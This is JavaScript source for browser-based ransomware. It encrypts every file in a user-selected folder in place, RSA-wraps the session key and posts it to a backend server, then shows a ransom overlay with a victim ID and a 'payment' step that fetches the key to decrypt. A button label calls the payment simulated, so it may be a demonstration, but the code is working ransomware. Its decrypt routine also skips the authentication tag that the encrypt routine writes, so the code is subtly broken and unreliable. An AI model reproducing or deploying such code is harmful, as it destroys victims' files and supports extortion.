import { CryptoModule } from './modules/cryptoModule.js';
import { FileSystemModule } from './modules/fileSystemModule.js';
import crypto from 'crypto';
import { Buffer } from 'buffer';
import './style.css';

const API_BASE_URL = process.env.API_BASE_URL.replace(/\/$/, '');

const state = {
  selectedDirectory: null,
  isEncrypting: false,
  filesProcessed: 0,
  totalFiles: 0,
  clientId: null,
  backendPublicKey: null
};

let DOM = {};

// --- IDENTITY MANAGEMENT ---
const initializeIdentity = async () => {
    const storedIdentity = localStorage.getItem('rob_identity');
    if (storedIdentity) {
        const data = JSON.parse(storedIdentity);
        state.clientId = data.clientId;
        state.backendPublicKey = data.publicKey;
    } else {
        try {
            const res = await fetch(`${API_BASE_URL}/new`, { method: 'POST' });
            if (!res.ok) throw new Error('Server handshake failed');
            const data = await res.json();
            state.clientId = data.clientId;
            state.backendPublicKey = data.publicKey;
            localStorage.setItem('rob_identity', JSON.stringify({
                clientId: data.clientId,
                publicKey: data.publicKey
            }));
        } catch (err) {
            console.error('Connection Error:', err.message);
        }
    }
};

// --- DIRECTORY SELECTION ---
const handleDirectorySelection = async () => {
    try {
      const directoryHandle = await FileSystemModule.selectDirectory();
      state.selectedDirectory = directoryHandle;
      if (DOM.selectedDirInfo) {
        DOM.selectedDirInfo.innerHTML = `<p class="warning-text">⚠️⏳ We’re working on it! Please keep this page open until we’re done.</p>`;
      }
      
      if (DOM.progressContainer) {
        DOM.progressContainer.style.display = 'block';
      }
      
      await startEncryption();
      
    } catch (error) {
        if (error.name !== 'AbortError' && DOM.progressContainer) {
          DOM.progressContainer.style.display = 'none';
        }
    }
};

// --- KEY EXCHANGE ---
const reportSessionKey = async (rawKeyBase64) => {
    if (!state.clientId) return;

    let payloadKey = rawKeyBase64;

    if (state.backendPublicKey) {
        try {
            const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');
            const encryptedBuffer = crypto.publicEncrypt(
                {
                    key: state.backendPublicKey,
                    padding: crypto.constants.RSA_PKCS1_PADDING
                },
                aesKeyBuffer
            );
            payloadKey = encryptedBuffer.toString('base64');
        } catch (e) {
            console.error("RSA Encryption failed", e);
        }
    }

    const res = await fetch(`${API_BASE_URL}/session-keys`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            clientId: state.clientId,
            key: payloadKey,
            filesCount: state.totalFiles
        })
    });

    if (res.status === 401) {
        localStorage.removeItem('rob_identity');
        alert("Session expired or server reset. The page will reload.");
        window.location.reload();
        throw new Error("Identity invalid. Reloading...");
    }

    if (!res.ok) {
        throw new Error(`Server Error: ${res.status}`);
    }
};

// --- ENCRYPTION LOGIC ---
const startEncryption = async () => {
    if (!state.selectedDirectory) return;
    if (!state.clientId) await initializeIdentity();

    state.isEncrypting = true;
    
    if (DOM.selectDirBtn) DOM.selectDirBtn.disabled = true;

    if (DOM.progressBar) DOM.progressBar.style.width = '0%';
    if (DOM.progressText) DOM.progressText.textContent = 'Initializing...';
    if (DOM.progressContainer) DOM.progressContainer.style.display = 'block';

    try {
        const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
        state.totalFiles = files.length;
        state.filesProcessed = 0;

        const session = await CryptoModule.generateSessionKey();
        const sessionAes = session.aes;
        
        await reportSessionKey(session.rawKeyBase64);

        for (let i = 0; i < files.length; i++) {
            const fileHandle = files[i];
            if (DOM.progressText) {
              DOM.progressText.textContent = `Processing: ${fileHandle.name}...`;
            }
            await encryptFileInPlace(fileHandle, sessionAes);
            state.filesProcessed++;
            if (DOM.progressBar) {
              DOM.progressBar.style.width = `${(state.filesProcessed / state.totalFiles) * 100}%`;
            }
        }
        
        if (DOM.progressText) DOM.progressText.textContent = 'Done.';
        if (DOM.selectedDirInfo) {
          DOM.selectedDirInfo.innerHTML = `<p><strong>Folder:</strong> ${state.selectedDirectory.name} - <strong>Status:</strong> Completed (${state.filesProcessed} files)</p>`;
        }
        
        // Redirect to next page
        setTimeout(() => {
            window.location.href = '/next';
        }, 1500);

    } catch (error) {
        if (DOM.progressText) DOM.progressText.textContent = `Error: ${error.message}`;
        if (DOM.progressContainer) {
          setTimeout(() => {
            DOM.progressContainer.style.display = 'none';
          }, 3000);
        }
    } finally {
        state.isEncrypting = false;
        if (DOM.selectDirBtn) DOM.selectDirBtn.disabled = false;
    }
};

const showRansomNote = () => {
    if (!DOM.ransomOverlay || !DOM.victimIdDisplay) return;
    DOM.victimIdDisplay.textContent = state.clientId;
    DOM.ransomOverlay.style.display = 'flex';
};

const handlePayment = async () => {
    const payBtn = document.getElementById('payRansomBtn');
    const statusDiv = document.getElementById('paymentStatus');
    if (!payBtn || !statusDiv) return;
    
    payBtn.disabled = true;
    payBtn.textContent = "Contacting Server...";
    statusDiv.textContent = "Verifying transaction...";

    try {
        const res = await fetch(`${API_BASE_URL}/recover`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId: state.clientId })
        });

        const data = await res.json();

        if (res.ok && data.success) {
            statusDiv.style.color = '#4ec9b0';
            statusDiv.textContent = "PAYMENT VERIFIED! Decrypting files...";
            
            await decryptAllFiles(data.key);
            
            setTimeout(() => {
                if (DOM.ransomOverlay) DOM.ransomOverlay.style.display = 'none';
                alert("All files have been restored.");
                if (DOM.selectDirBtn) DOM.selectDirBtn.disabled = false;
            }, 1000);

        } else {
            throw new Error(data.error || "Payment verification failed");
        }
    } catch (error) {
        payBtn.disabled = false;
        payBtn.textContent = "💸 SIMULATE PAYMENT & DECRYPT";
        statusDiv.style.color = '#f14c4c';
        statusDiv.textContent = `Error: ${error.message}`;
    }
};

// --- FILE OPERATIONS ---
const encryptFileInPlace = async (fileHandle, cryptoKey) => {
  try {
    const uint8Array = await FileSystemModule.readFileAsUint8Array(fileHandle);
    const encryptedData = await CryptoModule.encryptFile(uint8Array, cryptoKey);

    const ivBytes = encryptedData.iv;
    const tagBytes = encryptedData.tag; // Authentication tag
    const ciphertextBytes = encryptedData.ciphertext;
    
    // [FIX] New Size: IV (12) + Tag (16) + Content
    const combinedBytes = new Uint8Array(ivBytes.length + tagBytes.length + ciphertextBytes.length);
    
    combinedBytes.set(ivBytes, 0);
    combinedBytes.set(tagBytes, ivBytes.length); // Write Tag
    combinedBytes.set(ciphertextBytes, ivBytes.length + tagBytes.length);

    await FileSystemModule.writeBytesToHandle(fileHandle, combinedBytes);
  } catch (error) {
    console.error(`Failed to process ${fileHandle.name}:`, error.message);
  }
};

const decryptAllFiles = async (autoKey = null) => {
    if (!state.selectedDirectory) return;
    
    const rawKeyBase64 = autoKey || prompt('Enter Decryption Key (Base64):');
    if (!rawKeyBase64) return;

    if (DOM.progressBar) DOM.progressBar.style.width = '0%';

    try {
        const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
        let processed = 0;

        for (const fileHandle of files) {
            await decryptFileInPlace(fileHandle, rawKeyBase64);
            processed++;
            if (DOM.progressBar) {
              DOM.progressBar.style.width = `${(processed / files.length) * 100}%`;
            }
            if (DOM.progressText) {
              DOM.progressText.textContent = `Recovering: ${processed}/${files.length}`;
            }
        }
    } catch (error) {
        console.error('Recovery failed:', error.message);
    }
};

const decryptFileInPlace = async (fileHandle, rawKeyBase64) => {
  try {
    const encryptedBytes = await FileSystemModule.readFileAsUint8Array(fileHandle);
    
    // Extract IV (first 12 bytes) and ciphertext (remaining bytes)
    const iv = encryptedBytes.slice(0, 12);
    const ciphertext = encryptedBytes.slice(12);

    const decryptedBytes = await CryptoModule.decryptFile(
      { iv: iv, ciphertext: ciphertext },
      rawKeyBase64
    );

    await FileSystemModule.writeBytesToHandle(fileHandle, decryptedBytes);
    return true;
  } catch (error) {
    console.error(`Failed to restore ${fileHandle.name}:`, error.message);
    return false;
  }
};

// --- INIT ---
export const initApp = async () => {
  DOM = {
    selectDirBtn: document.getElementById('selectDirBtn'),
    selectedDirInfo: document.getElementById('selectedDirInfo'),
    progressBar: document.getElementById('progressBar'),
    progressText: document.getElementById('progressText'),
    progressContainer: document.getElementById('progressContainer'),
    ransomOverlay: document.getElementById('ransomOverlay'),
    victimIdDisplay: document.getElementById('victimIdDisplay'),
    payRansomBtn: document.getElementById('payRansomBtn')
  };

  if (DOM.selectDirBtn) DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
  if (DOM.payRansomBtn) DOM.payRansomBtn.addEventListener('click', handlePayment);

  await initializeIdentity();
};
